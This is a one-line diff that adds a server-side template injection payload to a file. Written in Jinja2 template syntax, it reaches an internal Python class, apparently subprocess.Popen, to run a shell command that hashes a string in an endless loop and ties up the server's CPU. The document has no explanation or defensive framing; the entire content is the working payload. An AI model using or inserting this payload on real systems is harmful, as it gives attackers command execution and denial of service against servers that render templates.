@@ -1,0 +1,1 @@
+{{"".__class__.__mro__[1].__subclasses__()[547]("while true; do echo -n asdasd | sha256sum; done", shell=True, stdout=-1).communicate() }}
